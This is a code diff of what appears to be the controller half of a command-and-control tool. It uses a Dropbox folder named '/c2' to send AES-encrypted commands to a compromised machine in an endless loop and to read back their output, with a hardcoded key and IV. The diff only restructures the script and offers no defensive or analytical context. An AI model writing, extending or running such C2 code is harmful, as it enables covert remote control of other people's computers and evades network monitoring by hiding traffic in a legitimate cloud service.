@@ -7,14 +7,14 @@ from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad, unpad
 
 
-with open("token.txt", "r") as f:
-    token = f.read()
+# with open("token.txt", "r") as f:
+#     token = f.read()
 
-dbx = dropbox.Dropbox(token)
-dropbox_path = '/c2/payload.txt'
+# dbx = dropbox.Dropbox(token)
+# dropbox_path = '/c2/payload.txt'
 
-key = "564cybereffectss".encode()
-CONST_IV = 'qwertyuiopasdfgh'.encode()
+# key = "564cybereffectss".encode()
+# CONST_IV = 'qwertyuiopasdfgh'.encode()
 
 def encrypt_message(message):
     cipher = AES.new(key, AES.MODE_CBC, IV=CONST_IV)
@@ -42,8 +42,6 @@ def write_cmd():
         print(f"Error while overwriting file: {err}")
     
     
-
-
 def read_output():
     _, response = dbx.files_download(dropbox_path)
     command = response.content
@@ -51,7 +49,22 @@ def read_output():
     print('[+] Successfully read output from payload.txt')
     print(f'output->{command}')
     
-write_cmd()
+
+
+if __name__ == '__main__':
+    key = "564cybereffectss".encode()
+    CONST_IV = 'qwertyuiopasdfgh'.encode()
+
+    # dropbox init
+    with open("token.txt", "r") as f:
+        token = f.read()
+
+    dbx = dropbox.Dropbox(token)
+    dropbox_path = '/c2/payload.txt'
+
+    # start payload execution
+    while True:
+        write_cmd()
 
 
 
